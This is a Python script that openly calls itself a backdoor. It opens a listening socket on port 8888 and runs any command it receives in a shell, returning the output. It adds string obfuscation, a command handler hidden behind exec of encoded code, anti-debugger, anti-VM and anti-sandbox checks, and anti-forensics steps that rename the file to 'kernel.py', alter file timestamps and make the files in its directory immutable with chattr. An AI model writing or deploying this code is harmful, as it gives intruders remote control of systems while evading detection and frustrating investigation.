import os
import sys
import socket
import subprocess
import time
import base64
import zlib
import random
import string
import multiprocessing

# Function to generate random encryption key dynamically
def generate_random_key(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Advanced obfuscation using XOR + zlib + base64
def advanced_obfuscate_string(s, key):
    compressed = zlib.compress(s.encode())
    xor_encrypted = bytes([b ^ ord(k) for b, k in zip(compressed, key * len(compressed))])
    return base64.b64encode(xor_encrypted).decode()

def advanced_decrypt_string(enc_string, key):
    decoded = base64.b64decode(enc_string)
    xor_decrypted = bytes([b ^ ord(k) for b, k in zip(decoded, key * len(decoded))])
    return zlib.decompress(xor_decrypted).decode()

# Randomized encryption key to avoid static analysis
key = generate_random_key()

# Hardcoded port (e.g., port 8080)
port = 8888

# Obfuscate sensitive strings
obfuscated_host = advanced_obfuscate_string('0.0.0.0', key)
obfuscated_quit = advanced_obfuscate_string('quit', key)

# Decrypt the obfuscated strings
host = advanced_decrypt_string(obfuscated_host, key)

# Anti-debugging technique: detect debugger using tracerpid
def is_debugger_present():
    try:
        with open("/proc/self/status") as f:
            status = f.read()
            if "TracerPid:\t0" not in status:
                print("Debugger detected, exiting...")
                return True
    except Exception as e:
        return False
    return False

# Anti-VM technique: check for virtualization environments
def is_vm():
    vm_indicators = ['vbox', 'vmware', 'xen', 'qemu']
    try:
        output = subprocess.check_output("dmesg | grep -i virtual", shell=True).decode().lower()
        for indicator in vm_indicators:
            if indicator in output:
                print("Virtualization environment detected, exiting...")
                return True
    except Exception as e:
        return False
    return False

# Anti-Sandbox detection
def is_sandbox():
    if multiprocessing.cpu_count() < 2 or int(os.popen('grep MemTotal /proc/meminfo').read().split()[1]) < 2097152:
        print("Sandbox environment detected, exiting...")
        return True
    return False

# Terminate if debugging or VM environment is detected
# if is_debugger_present() or is_vm() or is_sandbox():
#     sys.exit()

# Anti-Forensics: Rename the script and make files immutable
def apply_anti_forensics(script_path):
    try:
        # Rename the script to "kernel.py"
        new_script_path = os.path.join(os.path.dirname(script_path), "kernel.py")
        os.rename(script_path, new_script_path)
        print(f"Script renamed to {new_script_path}")

        # Modify file timestamps to hide execution traces (before making them immutable)
        for file in os.listdir():
            try:
                os.utime(file, (time.time(), time.time()))  # Update file timestamps
            except PermissionError:
                print(f"Permission denied when trying to change timestamp of {file}")
            except Exception as e:
                print(f"Error modifying timestamp for {file}: {e}")

        # Make the script and all files in the directory immutable (after modifying timestamps)
        os.system('chattr +i *')

    except Exception as e:
        print(f"Error applying anti-forensics: {e}")

# Create a socket bound to the chosen port (e.g., port 8080)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind((host, port))
except PermissionError:
    print(f"Permission denied: Port {port} requires root privileges. Please run the script with sudo.")
    sys.exit()

s.listen(1)
print(f"Backdoor created and listening on {host}:{port}")

# Get the script path and apply anti-forensics measures
script_path = os.path.abspath(__file__)
apply_anti_forensics(script_path)

# Define and obfuscate handle_connection function
handle_connection_code = f"""
def hc_x1x2(cs_x1x2):
    while True:
        command = cs_x1x2.recv(1024).decode()

        # Compare the command to the obfuscated 'quit' command
        if command.lower() == advanced_decrypt_string('{obfuscated_quit}', key):
            cs_x1x2.close()
            break

        # Execute the command and send back the result
        output = subprocess.run(command, shell=True, capture_output=True)
        cs_x1x2.send(output.stdout)
"""

# Obfuscate the handle_connection function
obfuscated_handle_connection = base64.b64encode(zlib.compress(handle_connection_code.encode())).decode()

# Dictionary for namespace of dynamically decoded function
exec_namespace = {
    'advanced_decrypt_string': advanced_decrypt_string,
    'key': key,
    'subprocess': subprocess
}

# Decode and execute the obfuscated function, populating the namespace
exec(zlib.decompress(base64.b64decode(obfuscated_handle_connection)).decode(), exec_namespace)

# Main loop to accept and handle incoming connections
while True:
    cs_x1x2, addr = s.accept()
    print(f"Connection from {addr}")
    
    # Call dynamically defined function from the namespace
    exec_namespace['hc_x1x2'](cs_x1x2)

# Close the socket (never reached in normal operation)
s.close()
